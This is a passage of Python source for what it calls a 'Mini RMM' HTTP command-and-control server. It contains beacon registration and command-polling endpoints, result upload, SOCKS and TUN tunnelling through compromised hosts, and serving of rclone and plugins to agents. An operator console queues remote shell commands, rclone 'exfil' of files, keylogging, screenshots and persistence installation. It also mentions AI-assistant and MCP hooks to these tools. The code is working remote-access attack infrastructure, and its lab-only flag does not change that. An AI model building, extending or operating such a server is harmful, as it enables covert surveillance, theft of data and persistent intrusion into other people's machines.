        if parts == ["ui", "config"]:
            try:
                result = srv.set_ui_state(body.get("config", body))
            except UiStateError as exc:
                self._json(400, {"error": "invalid_ui_state", "detail": str(exc)})
                return True
            self._json(
                200,
                {
                    "ok": True,
                    "config": result["state"],
                    "updated_at": result["updated_at"],
                    "storage": "sqlite",
                    "scope": "server",
                },
            )
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "config":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            ok = srv.update_session_config(
                session.id,
                sleep_seconds=body.get("sleep_seconds"),
                jitter_percent=body.get("jitter_percent"),
            )
            if ok:
                parts_cfg = []
                if body.get("sleep_seconds") is not None:
                    parts_cfg.append(f"sleep={body['sleep_seconds']}")
                if body.get("jitter_percent") is not None:
                    parts_cfg.append(f"jitter={body['jitter_percent']}")
                if parts_cfg:
                    srv.record_operator_action(session, " ".join(parts_cfg), "config")
                self._json(200, {"ok": True, "session": session.to_dict()})
            else:
                self._json(404, {"error": "session_not_found"})
            return True

        if len(parts) == 3 and parts[0] == "assets":
            try:
                kind = parts[1]
                name = urllib.parse.unquote(parts[2])
                if kind in {"skills", "skill"} and not os.path.splitext(name)[1]:
                    row = asset_store().set_flag(kind, name, bool(body.get("enabled")))
                else:
                    row = asset_store().set_enabled(kind, name, bool(body.get("enabled")))
            except AssetError as exc:
                self._json(404, {"error": str(exc)})
                return True
            self._json(200, {"ok": True, "asset": row, "workspace_local": False})
            return True

        self._json(404, {"error": "not_found"})
        return True

    def _handle_api_delete(self, path):
        if not self._api_authorized():
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance

        if len(parts) == 4 and parts[0] == "sessions" and parts[2] == "ai" and parts[3] == "chat":
            if getattr(self, "_workspace_scope", lambda: None)() and not _resolve_api_session(self, parts[1]):
                self._json(404, {"error": "session_not_found"})
                return True
            session_id, _messages = srv.get_ai_chat(parts[1])
            if session_id is None:
                self._json(404, {"error": "session_not_found"})
                return True
            srv.clear_ai_chat(session_id)
            self._json(200, {"ok": True, "session_id": session_id})
            return True

        if len(parts) == 2 and parts[0] == "sessions":
            session = _resolve_api_session(self, parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            ok, detail = srv.kill_session(session.id)
            if not ok:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"ok": True, "session_id": detail})
            return True

        if parts == ["history"]:
            deleted, errors = srv.clear_session_history()
            self._json(200, {"ok": True, "deleted": deleted, "errors": errors})
            return True

        if len(parts) == 2 and parts[0] == "history":
            ok, session_id, err, artifacts = srv.delete_history_session(parts[1])
            if not ok:
                status = 409 if err == "session_still_active" else 404
                self._json(status, {"error": err or "history_not_found"})
                return True
            body = {"ok": True, "session_id": session_id}
            if artifacts:
                body["artifacts_purged"] = artifacts
            self._json(200, body)
            return True

        if len(parts) == 3 and parts[0] == "assets":
            kind, name = parts[1], urllib.parse.unquote(parts[2])
            try:
                removed = asset_store().remove(kind, name)
                if kind == "plugins":
                    path = safe_join_under(plugin_directory(), name)
                    if os.path.isfile(path):
                        os.unlink(path)
            except (AssetError, ValueError, OSError) as exc:
                self._json(404, {"error": "asset_not_found", "detail": str(exc)})
                return True
            if not removed:
                self._json(404, {"error": "asset_not_found"})
                return True
            self._json(200, {"ok": True, "kind": kind, "name": name})
            return True

        self._json(404, {"error": "not_found"})
        return True
    
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)

        if not self._path_allowed(path, method="GET"):
            self._respond(404, "Not Found")
            return

        if path == f"{API_PREFIX}/ws":
            if self._handle_websocket_upgrade(qs):
                return

        if path.startswith(API_PREFIX):
            if self._handle_api_get(path, qs):
                return
            self._respond(404, "Not Found")
            return

        if path == "/tools/rclone.exe":
            if not self._beacon_authorized(qs):
                self._beacon_forbidden()
                return
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
                return
            if not self.server_instance.get_session(session_id):
                self._respond(404, "Unknown session")
                return
            if self._serve_rclone_tool():
                return

        if path.startswith("/tools/plugins/"):
            plugin_name = path[len("/tools/plugins/"):]
            if not self._beacon_authorized(qs):
                self._beacon_forbidden()
                return
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
                return
            if not self.server_instance.get_session(session_id):
                self._respond(404, "Unknown session")
                return
            if self._serve_plugin_tool(plugin_name, session_id):
                return

        if self._serve_web(path):
            return
        
        if path in ("/register", "/cmd", "/ping", "/socks", "/socks-ws", "/tun"):
            if not self._beacon_authorized(qs):
                self._beacon_forbidden()
                return

        if path == "/register":
            raw_id = qs.get("id", [None])[0]
            if raw_id is None or not str(raw_id).strip():
                self._respond(400, "Missing session ID")
                return
            session_id = validate_beacon_session_id(str(raw_id))
            if not session_id:
                self._respond(400, "INVALID SESSION ID")
                return
            hostname = qs.get("h", ["unknown"])[0]
            username = qs.get("u", ["unknown"])[0]
            ip = self.client_address[0]
            sleep_seconds = None
            jitter_percent = None
            sync_client = str(qs.get("sync", ["0"])[0]).lower() in ("1", "true", "yes")
            agent_type = qs.get("agent", ["powershell"])[0]
            capabilities = [item.strip().lower() for item in qs.get("caps", [""])[0].split(",") if item.strip()]
            try:
                if qs.get("s", [None])[0] is not None:
                    sleep_seconds = int(qs["s"][0])
            except (TypeError, ValueError):
                pass
            try:
                if qs.get("j", [None])[0] is not None:
                    jitter_percent = int(qs["j"][0])
            except (TypeError, ValueError):
                pass
            reg = self.server_instance.register_session(
                session_id,
                hostname,
                username,
                ip,
                sleep_seconds=sleep_seconds,
                jitter_percent=jitter_percent,
                sync_client_config=sync_client,
                agent_type=agent_type,
                capabilities=capabilities,
            )
            if reg is None:
                self._respond(403, "TERMINATED")
            else:
                self._respond(200, "REGISTERED" if reg else "UPDATED")
        
        elif path == "/cmd":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
            else:
                cmd, resp_type = self.server_instance.get_command(session_id)
                response = json.dumps({
                    "command": cmd,
                    "type": resp_type,
                    "socks_active": self.server_instance.socks_active(session_id),
                    "tun_active": self.server_instance.tun_active(session_id),
                })
                self._respond(200, response, "application/json")
        
        elif path == "/ping":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
            else:
                self.server_instance.touch_session(session_id)
                self._respond(200, "PONG")

        elif path in ("/socks", "/socks-ws"):
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
            elif self.headers.get("Upgrade", "").lower() == "websocket":
                if not self.server_instance.socks_active(session_id):
                    self._respond(403, "SOCKS relay not active")
                else:
                    self._handle_socks_agent_websocket(session_id)
            elif path == "/socks-ws":
                self._respond(426, "Upgrade Required")
            else:
                self.server_instance.touch_session(session_id)
                tasks = self.server_instance.socks.poll_tasks(session_id)
                active = self.server_instance.socks_active(session_id)
                self._respond(
                    200,
                    json.dumps({"active": active, "tasks": tasks}),
                    "application/json",
                )

        elif path == "/tun":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
            else:
                self.server_instance.touch_session(session_id)
                tasks = self.server_instance.tun_transport.poll_tasks(session_id)
                active = self.server_instance.tun_active(session_id)
                self._respond(
                    200,
                    json.dumps({"active": active, "tasks": tasks}),
                    "application/json",
                )
        
        else:
            self._respond(404, "Not Found")
    
    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)

        if not self._path_allowed(path, method="POST"):
            self._respond(404, "Not Found")
            return

        if path.startswith(API_PREFIX):
            try:
                body = self._read_json_body()
            except ValueError:
                self._json(413, {"error": "payload_too_large"})
                return
            except json.JSONDecodeError:
                self._json(400, {"error": "invalid_json"})
                return
            if self._handle_api_post(path, body):
                return
            self._respond(404, "Not Found")
            return

        if path in ("/result", "/socks", "/tun"):
            if not self._beacon_authorized(qs):
                self._beacon_forbidden()
                return
            try:
                body = self._read_body_bytes().decode(errors="replace")
            except ValueError:
                self._respond(413, "PAYLOAD TOO LARGE")
                return

        if path == "/socks":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
                return
            self.server_instance.touch_session(session_id)
            if not self.server_instance.socks.post_responses(session_id, body):
                self._respond(400, "INVALID SOCKS PAYLOAD")
            else:
                self._respond(200, "OK")
            return

        if path == "/tun":
            err, session_id = self._beacon_session_id_from_qs(qs)
            if err:
                self._respond(400, err)
                return
            self.server_instance.touch_session(session_id)
            if not self.server_instance.tun_transport.post_responses(session_id, body):
                self._respond(400, "INVALID TUN PAYLOAD")
            else:
                self._respond(200, "OK")
            return

        if path == "/result":
            raw_id = qs.get("id", [None])[0]
            result_type = qs.get("type", ["output"])[0]
            if raw_id is None or not str(raw_id).strip():
                self._respond(400, "Missing session ID")
                return
            session_id = validate_beacon_session_id(str(raw_id))
            if not session_id:
                self._respond(400, "INVALID SESSION ID")
                return
            self._respond(200, "OK")
            threading.Thread(
                target=self.server_instance.handle_result,
                args=(session_id, body, result_type),
                daemon=True,
            ).start()
            return

        self._respond(404, "Not Found")

    def do_PATCH(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        if not self._path_allowed(path, method="PATCH"):
            self._respond(404, "Not Found")
            return
        if not path.startswith(API_PREFIX):
            self._respond(404, "Not Found")
            return
        try:
            body = self._read_json_body()
        except ValueError:
            self._json(413, {"error": "payload_too_large"})
            return
        except json.JSONDecodeError:
            self._json(400, {"error": "invalid_json"})
            return
        if self._handle_api_patch(path, body):
            return
        self._respond(404, "Not Found")

    def do_DELETE(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        if not self._path_allowed(path, method="DELETE"):
            self._respond(404, "Not Found")
            return
        if not path.startswith(API_PREFIX):
            self._respond(404, "Not Found")
            return
        if self._handle_api_delete(path):
            return
        self._respond(404, "Not Found")

class CommandInterface:
    def __init__(self, server):
        self.server = server
        self.aliases = {
            "ls": "dir",
            "help": "?",
            "sessions": "list",
            "exit": "quit"
        }
    
    def show_help(self):
        help_text = f"""
{Colors.BOLD}Available Commands:{Colors.END}

{Colors.CYAN}Session Management:{Colors.END}
  {Colors.GREEN}list{Colors.END}                     - List active sessions
  {Colors.GREEN}use <session_id>{Colors.END}         - Select a session (full ID or first 4+ chars)
  {Colors.GREEN}info{Colors.END}                     - Show current session info
  {Colors.GREEN}background{Colors.END}               - Return to global view
  {Colors.GREEN}kill <session_id>{Colors.END}        - End session and stop the remote client

{Colors.CYAN}Beacon Configuration:{Colors.END}
  {Colors.GREEN}set_sleep <seconds>{Colors.END}      - Set beacon interval (1-3600 seconds)
  {Colors.GREEN}set_jitter <percent>{Colors.END}     - Set jitter percentage (0-100)
  {Colors.GREEN}show_config{Colors.END}              - Show current session config

{Colors.CYAN}Command Execution:{Colors.END}
  {Colors.DIM}(commands queue FIFO between client polls){Colors.END}
  {Colors.DIM}Windows CMD: use double quotes for paths with spaces; NET GROUP needs group name before /domain.{Colors.END}
  {Colors.GREEN}<command>{Colors.END}                - CMD (cmd.exe), e.g. sc query, dir /w
  {Colors.GREEN}PS: / powershell: <script>{Colors.END}   - Windows PowerShell (powershell.exe)
  {Colors.GREEN}pwsh: <script>{Colors.END}           - PowerShell 7 if pwsh is installed
  {Colors.GREEN}cmd: <line>{Colors.END}             - Explicit CMD (same as default)
  {Colors.GREEN}shell <command>{Colors.END}          - Same as a bare command
  {Colors.GREEN}persist <command>{Colors.END}        - Persistent command (repeats)
  {Colors.GREEN}stop{Colors.END}                     - Stop persistent command

{Colors.CYAN}File Operations:{Colors.END}
  {Colors.GREEN}download <file>{Colors.END}          - Download file from target
  {Colors.GREEN}exfil <path> [profile]{Colors.END}   - Upload remote file or folder via rclone (agent)
  {Colors.GREEN}upload <local> <remote>{Colors.END}  - Upload file to target

{Colors.CYAN}Tunneling:{Colors.END}
  {Colors.GREEN}socks list{Colors.END}            - List all SOCKS relays and connected agents
  {Colors.GREEN}socks [port]{Colors.END}           - SOCKS5 on 127.0.0.1 (default port {DEFAULT_SOCKS_PORT})
  {Colors.GREEN}socks stop{Colors.END}             - Stop SOCKS relay for this session

{Colors.CYAN}Reconnaissance:{Colors.END}
  {Colors.GREEN}screenshot{Colors.END}               - Capture screenshot
  {Colors.GREEN}keylog start/stop/dump{Colors.END}   - Keylogging operations

{Colors.CYAN}Persistence:{Colors.END}
  {Colors.GREEN}install_persist{Colors.END}          - Install persistence
  {Colors.GREEN}remove_persist{Colors.END}           - Remove persistence

{Colors.CYAN}Other:{Colors.END}
  {Colors.GREEN}clear{Colors.END}                    - Clear screen
  {Colors.GREEN}quit{Colors.END}                     - Exit RMM server

{Colors.YELLOW}Tip:{Colors.END} Use TAB key for command completion and history navigation
"""
        self.server.tty_print(help_text)
    
    def execute_command(self, cmd_line):
        if not cmd_line.strip():
            return True

        parts = cmd_line.strip().split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []

        # Handle aliases
        cmd = self.aliases.get(cmd, cmd)

        # Global commands
        if cmd in ["quit", "exit"]:
            self.server.tty_print(f"{Colors.YELLOW}Shutting down server...{Colors.END}")
            if not getattr(self.server, "_cli_use_ptk", False):
                readline.write_history_file(HISTORY_FILE)
            self.server.running = False
            return False

        elif cmd == "list":
            self.server.list_sessions()

        elif cmd == "kill":
            if args:
                session_id_or_prefix = args[0]
                ok, detail = self.server.kill_session(session_id_or_prefix)
                if ok:
                    self.server.tty_print(f"{Colors.GREEN}Session {detail[:8]} terminated (client will exit on next beacon){Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Session not found: {session_id_or_prefix}{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.RED}Usage: kill <session_id>{Colors.END}")

        elif cmd == "use":
            if args:
                session_id_or_prefix = args[0]
                session = self.server.get_session(session_id_or_prefix)
                if not session:
                    session = self.server.find_session_by_prefix(session_id_or_prefix)

                if session:
                    self.server.current_session = session.id
                    self.server.tty_print(f"{Colors.GREEN}Selected session: {session}{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Session not found: {session_id_or_prefix}{Colors.END}")
                    self.server.tty_print(f"{Colors.YELLOW}Use 'list' to see available sessions{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.RED}Usage: use <session_id>{Colors.END}")
                self.server.tty_print(f"{Colors.YELLOW}You can use full ID or first 4+ characters (e.g., 'use 2318'){Colors.END}")

        elif cmd == "info":
            if self.server.current_session:
                session = self.server.get_session(self.server.current_session)
                if session:
                    self.server.tty_print(f"\n{Colors.BOLD}Session Information:{Colors.END}")
                    self.server.tty_print(f"  ID: {session.id}", ansi=False)
                    self.server.tty_print(f"  User: {session.username}", ansi=False)
                    self.server.tty_print(f"  Hostname: {session.hostname}", ansi=False)
                    self.server.tty_print(f"  IP: {session.ip or 'N/A'}", ansi=False)
                    self.server.tty_print(f"  First Seen: {session.first_seen}", ansi=False)
                    self.server.tty_print(f"  Last Seen: {session.last_seen}", ansi=False)
                    self.server.tty_print(f"  Working Dir: {session.work_dir or 'Unknown'}", ansi=False)
                    self.server.tty_print(f"  OS: {session.os_type}", ansi=False)
                    self.server.tty_print(f"  Sleep Interval: {session.sleep_seconds} seconds", ansi=False)
                    self.server.tty_print(f"  Jitter: {session.jitter_percent}%\n", ansi=False)
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected{Colors.END}")

        elif cmd == "show_config":
            if self.server.current_session:
                session = self.server.get_session(self.server.current_session)
                if session:
                    jitter_range = session.sleep_seconds * session.jitter_percent / 100
                    min_sleep = session.sleep_seconds - jitter_range
                    max_sleep = session.sleep_seconds + jitter_range
                    self.server.tty_print(f"\n{Colors.BOLD}Current Beacon Configuration:{Colors.END}")
                    self.server.tty_print(f"  Session: {session.id[:8]}", ansi=False)
                    self.server.tty_print(
                        f"  Sleep Interval: {Colors.GREEN}{session.sleep_seconds}{Colors.END} seconds"
                    )
                    self.server.tty_print(
                        f"  Jitter Percentage: {Colors.GREEN}{session.jitter_percent}{Colors.END}%"
                    )
                    self.server.tty_print(
                        f"  Effective Range: {Colors.CYAN}{min_sleep:.1f}{Colors.END} - "
                        f"{Colors.CYAN}{max_sleep:.1f}{Colors.END} seconds\n"
                    )
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected{Colors.END}")

        elif cmd == "set_sleep":
            if self.server.current_session:
                if args:
                    try:
                        new_sleep = int(args[0])
                        if 1 <= new_sleep <= 3600:
                            self.server.update_session_config(self.server.current_session, sleep_seconds=new_sleep)
                            self.server.tty_print(f"{Colors.GREEN}Sleep interval updated to {new_sleep} seconds{Colors.END}")
                            self.server.tty_print(f"{Colors.DIM}New config will take effect on next beacon{Colors.END}")
                        else:
                            self.server.tty_print(f"{Colors.RED}Sleep must be between 1 and 3600 seconds{Colors.END}")
                    except ValueError:
                        self.server.tty_print(f"{Colors.RED}Invalid number{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: set_sleep <seconds (1-3600)>{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'use <id>' first{Colors.END}")

        elif cmd == "set_jitter":
            if self.server.current_session:
                if args:
                    try:
                        new_jitter = int(args[0])
                        if 0 <= new_jitter <= 100:
                            self.server.update_session_config(self.server.current_session, jitter_percent=new_jitter)
                            self.server.tty_print(f"{Colors.GREEN}Jitter updated to {new_jitter}%{Colors.END}")
                            self.server.tty_print(f"{Colors.DIM}New config will take effect on next beacon{Colors.END}")
                        else:
                            self.server.tty_print(f"{Colors.RED}Jitter must be between 0 and 100{Colors.END}")
                    except ValueError:
                        self.server.tty_print(f"{Colors.RED}Invalid number{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: set_jitter <percent (0-100)>{Colors.END}")
            else:
                self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'use <id>' first{Colors.END}")

        elif cmd == "background":
            self.server.current_session = None
            self.server.tty_print(f"{Colors.GREEN}Returned to global view{Colors.END}")

        elif cmd == "help" or cmd == "?":
            self.show_help()

        elif cmd == "clear":
            os.system('clear' if os.name == 'posix' else 'cls')

        # Commands that require a selected session
        elif self.server.current_session:
            if cmd in ["shell", "exec"]:
                command = " ".join(args)
                if command:
                    self.server.set_command(self.server.current_session, command, "oneshot")
                    self.server.tty_print(f"{Colors.DIM}Command sent...{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: shell <command>{Colors.END}")

            elif cmd == "persist":
                command = " ".join(args)
                if command:
                    self.server.set_command(self.server.current_session, command, "persistent")
                    self.server.tty_print(f"{Colors.DIM}Persistent command activated (use 'stop' to end){Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: persist <command>{Colors.END}")

            elif cmd == "stop":
                self.server.set_command(self.server.current_session, "__STOP__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Persistent command stopped{Colors.END}")

            elif cmd == "download":
                if args:
                    filepath = " ".join(args)
                    session = self.server.get_session(self.server.current_session)
                    if session:
                        self.server.queue_agent_download(session, filepath)
                        self.server.tty_print(f"{Colors.DIM}Downloading {filepath}...{Colors.END}")
                    else:
                        self.server.tty_print(f"{Colors.RED}No active session{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: download <file>{Colors.END}")

            elif cmd == "exfil":
                if args:
                    session = self.server.get_session(self.server.current_session)
                    if not session:
                        self.server.tty_print(f"{Colors.RED}No active session{Colors.END}")
                    else:
                        filepath = args[0]
                        profile = args[1] if len(args) > 1 else get_rclone_default_profile()
                        try:
                            self.server.queue_agent_exfil(session, filepath, profile)
                            self.server.tty_print(
                                f"{Colors.DIM}Exfil queued ({profile}): {filepath}...{Colors.END}"
                            )
                        except (ValueError, RcloneConfigError) as e:
                            self.server.tty_print(f"{Colors.RED}{e}{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: exfil <remote_path> [profile]{Colors.END}")

            elif cmd == "upload":
                if len(args) >= 2:
                    local_file = args[0]
                    remote_file = args[1]
                    if os.path.exists(local_file):
                        with open(local_file, 'rb') as f:
                            content = base64.b64encode(f.read()).decode()
                        data = json.dumps({
                            "filename": os.path.basename(remote_file.replace("\\", "/")),
                            "src_filename": os.path.basename(local_file),
                            "content": content
                        })
                        self.server.set_command(self.server.current_session, f"__UPLOAD__ {remote_file}\n{data}", "oneshot")
                        self.server.tty_print(f"{Colors.DIM}Uploading {local_file} to {remote_file}...{Colors.END}")
                    else:
                        self.server.tty_print(f"{Colors.RED}Local file not found: {local_file}{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: upload <local_file> <remote_file>{Colors.END}")

            elif cmd == "screenshot":
                self.server.set_command(self.server.current_session, "__SCREENSHOT__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Taking screenshot...{Colors.END}")

            elif cmd in ["keylog", "keylogger"]:
                if args:
                    action = args[0]
                    self.server.set_command(self.server.current_session, f"__KEYLOG__ {action}", "oneshot")
                    self.server.tty_print(f"{Colors.DIM}Keylog {action}...{Colors.END}")
                else:
                    self.server.tty_print(f"{Colors.RED}Usage: keylog start/stop/dump{Colors.END}")

            elif cmd == "install_persist":
                self.server.set_command(self.server.current_session, "__INSTALL_PERSIST__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Installing persistence...{Colors.END}")

            elif cmd == "remove_persist":
                self.server.set_command(self.server.current_session, "__REMOVE_PERSIST__", "oneshot")
                self.server.tty_print(f"{Colors.DIM}Removing persistence...{Colors.END}")

            elif cmd == "socks":
                if args and args[0].lower() == "list":
                    relays = self.server.list_socks_status()
                    if not relays:
                        self.server.tty_print(f"{Colors.DIM}No active SOCKS relays{Colors.END}")
                    else:
                        for r in relays:
                            agent = (
                                f"{r.get('username')}@{r.get('hostname')}"
                                if r.get("hostname")
                                else r["session_id"][:8]
                            )
                            ch = r.get("agent_channel", "?")
                            url = r.get("socks_url", "")
                            tunnels = r.get("active_tunnels", 0)
                            self.server.tty_print(
                                f"{Colors.GREEN}{url}{Colors.END} → {agent} "
                                f"({ch}, tunnels={tunnels}, beacon={r.get('beacon_status')})",
                                ansi=False,
                            )
                    return True
                if args and args[0].lower() == "stop":
                    self.server.stop_socks(self.server.current_session)
                    self.server.tty_print(f"{Colors.DIM}SOCKS relay stopped{Colors.END}")
                else:
                    port = DEFAULT_SOCKS_PORT
                    if args:
                        try:
                            port = int(args[0])
                            if port < 1 or port > 65535:
                                raise ValueError
                        except ValueError:
                            self.server.tty_print(f"{Colors.RED}Invalid port (1-65535){Colors.END}")
                            return True
                    if self.server.start_socks(self.server.current_session, port):
                        self.server.tty_print(
                            f"{Colors.GREEN}SOCKS5 on {DEFAULT_BIND_HOST}:{port} — "
                            f"point tools at socks5://127.0.0.1:{port}{Colors.END}"
                        )
                        self.server.tty_print(
                            f"{Colors.DIM}Client must beacon; traffic exits the remote host. "
                            f"Use 'socks stop' when done.{Colors.END}"
                        )
                    else:
                        self.server.tty_print(f"{Colors.RED}Failed to start SOCKS (session or bind error){Colors.END}")

            else:
                # Regular shell command
                self.server.set_command(self.server.current_session, cmd_line, "oneshot")
                self.server.tty_print(f"{Colors.DIM}Command sent...{Colors.END}")

        else:
            self.server.tty_print(f"{Colors.YELLOW}No session selected. Use 'list' then 'use <id>' or type 'help'{Colors.END}")
            self.server.tty_print(f"{Colors.YELLOW}Tip: You can use the first 4-8 characters of the session ID (e.g., 'use 2318'){Colors.END}")

        return True

def main():
    global PORT, ADMIN_PORT, BEACON_PORT, API_TOKEN, BEACON_SECRET, INSECURE, LISTEN_HOST, BEACON_BIND

    parser = argparse.ArgumentParser(description="Mini RMM HTTP server")
    parser.add_argument(
        "port",
        nargs="?",
        type=int,
        default=None,
        help="Legacy alias for the administration port",
    )
    parser.add_argument(
        "--admin-port",
        type=int,
        default=None,
        help="Operator administration port (env: RMM_ADMIN_PORT; default: 8080)",
    )
    parser.add_argument(
        "--beacon-port",
        type=int,
        default=None,
        help="Agent beacon port (env: RMM_BEACON_PORT; default: admin port + 1)",
    )
    parser.add_argument(
        "--cli",
        action="store_true",
        help="Run embedded interactive console (default: API-only headless)",
    )
    parser.add_argument(
        "--token",
        default="",
        help="Operator API token (or set RMM_API_TOKEN)",
    )
    parser.add_argument(
        "--beacon-secret",
        default="",
        help="Beacon shared secret (or set RMM_BEACON_SECRET); required for clients",
    )
    parser.add_argument(
        "--bind",
        default=LISTEN_HOST,
        help="Administration listen address (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--beacon-bind",
        default=BEACON_BIND,
        help="Beacon listen address (default: same as --bind)",
    )
    parser.add_argument(
        "--profile",
        default=os.environ.get("RMM_PROFILE_NAME", "cloudflared"),
        help="RMM-Profile to start when installed (env: RMM_PROFILE_NAME)",
    )
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="LAB ONLY: allow missing API/beacon secrets (open C2 — never on a network)",
    )
    parser.add_argument(
        "--rclone-profiles",
        default="",
        metavar="PATH",
        help="rclone exfil profiles JSON file (or set RMM_RCLONE_PROFILES_FILE)",
    )
    parser.add_argument(
        "--rclone-max-bytes",
        default=None,
        type=int,
        metavar="N",
        help="Max exfil size in bytes (file or folder); 0 = unlimited (or set RMM_RCLONE_MAX_BYTES)",
    )
    args = parser.parse_args()
    admin_port = args.admin_port if args.admin_port is not None else args.port
    if admin_port is None:
        admin_port = _env_int("RMM_ADMIN_PORT", 8080)
    beacon_port = args.beacon_port
    if beacon_port is None:
        beacon_port = _env_int("RMM_BEACON_PORT", admin_port + 1)
    if not 1 <= admin_port <= 65535 or not 1 <= beacon_port <= 65535:
        parser.error("admin and beacon ports must be between 1 and 65535")
    PORT = admin_port
    ADMIN_PORT = admin_port
    BEACON_PORT = beacon_port
    LISTEN_HOST = args.bind
    BEACON_BIND = args.beacon_bind or LISTEN_HOST
    INSECURE = args.insecure
    if args.token:
        API_TOKEN = args.token.strip()
    if args.beacon_secret:
        BEACON_SECRET = args.beacon_secret.strip()
    if args.rclone_profiles:
        profiles_path = os.path.abspath(args.rclone_profiles.strip())
        if not os.path.isfile(profiles_path):
            print(
                f"{Colors.RED}[!] rclone profiles file not found: {profiles_path}{Colors.END}",
                file=sys.stderr,
            )
            sys.exit(1)
        os.environ["RMM_RCLONE_PROFILES_FILE"] = profiles_path
    if args.rclone_max_bytes is not None:
        if args.rclone_max_bytes < 0:
            print(
                f"{Colors.RED}[!] --rclone-max-bytes must be >= 0 (0 = unlimited){Colors.END}",
                file=sys.stderr,
            )
            sys.exit(1)
        os.environ["RMM_RCLONE_MAX_BYTES"] = str(args.rclone_max_bytes)

    if not INSECURE:
        if not API_TOKEN:
            print(
                f"{Colors.RED}[!] Set RMM_API_TOKEN (or --token). "
                f"Use --insecure for local lab only.{Colors.END}",
                file=sys.stderr,
            )
            sys.exit(1)
        if not BEACON_SECRET:
            print(
                f"{Colors.RED}[!] Set RMM_BEACON_SECRET (or --beacon-secret). "
                f"Use --insecure for local lab only.{Colors.END}",
                file=sys.stderr,
            )
            sys.exit(1)
    else:
        print(
            f"{Colors.RED}[!] --insecure: operator API and beacon endpoints are unauthenticated{Colors.END}"
        )

    print(f"{Colors.BOLD}{Colors.HEADER}")
    print("""
    ╔═══════════════════════════════════════════╗
    ║        Mini RMM Server v3.0                ║
    ║     HTTP Command & Control + REST API      ║
    ║   Operator CLI: python rmm_cli.py          ║
    ╚═══════════════════════════════════════════╝
    """ + Colors.END)

    server = RMMServer()
    RMMHandler.server_instance = server

    def make_http_server(bind: str, port: int, role: str):
        """Bind one role-specific threaded HTTP listener."""
        handler = type(
            f"{role.title()}RMMHandler",
            (RMMHandler,),
            {"server_instance": server, "listener_role": role},
        )
        instance = ThreadingHTTPServer((bind, port), handler)
        instance.daemon_threads = True
        instance.listener_role = role
        instance.server_instance = server
        return instance

    if admin_port == beacon_port and LISTEN_HOST == BEACON_BIND:
        http_servers = [make_http_server(LISTEN_HOST, admin_port, "combined")]
    else:
        http_servers = [
            make_http_server(LISTEN_HOST, admin_port, "admin"),
            make_http_server(BEACON_BIND, beacon_port, "beacon"),
        ]
    server.set_listener_ports(admin_port, beacon_port)

    print(f"{Colors.GREEN}[*] Administration listener: {LISTEN_HOST}:{admin_port} (threaded HTTP){Colors.END}")
    print(f"{Colors.GREEN}[*] Beacon listener: {BEACON_BIND}:{beacon_port} (threaded HTTP){Colors.END}")
    print(f"{Colors.CYAN}[*] Operator API: http://127.0.0.1:{admin_port}{API_PREFIX}/{Colors.END}")
    print(f"{Colors.CYAN}[*] Web UI: http://127.0.0.1:{admin_port}/ui/{Colors.END}")
    print(f"{Colors.CYAN}[*] CLI: python rmm_cli.py --url http://127.0.0.1:{admin_port}{Colors.END}")
    print(f"{Colors.CYAN}[*] MCP: python mcp_rmm_server.py (see README){Colors.END}")
    print(f"{Colors.CYAN}[*] Web AI: /ui/ → AI Assistant panel (OpenAI key + RMM tools){Colors.END}")
    print(f"{Colors.CYAN}[*] RMM-Profile directory: {profile_directory()}{Colors.END}")
    print(f"{Colors.YELLOW}[*] Logs: {LOG_DIR}{Colors.END}")
    if API_TOKEN:
        print(f"{Colors.YELLOW}[*] Operator API auth: enabled ({API_PREFIX}/*){Colors.END}")
    if BEACON_SECRET:
        print(f"{Colors.YELLOW}[*] Beacon auth: X-RMM-Beacon-Token required{Colors.END}")
    print()

    http_threads = [
        threading.Thread(target=http_server.serve_forever, daemon=True, name=f"rmm-{http_server.listener_role}")
        for http_server in http_servers
    ]
    for http_thread in http_threads:
        http_thread.start()

    profile_auto_start = os.environ.get("RMM_PROFILE_AUTOSTART", "1").strip().lower() in {"1", "true", "yes"}
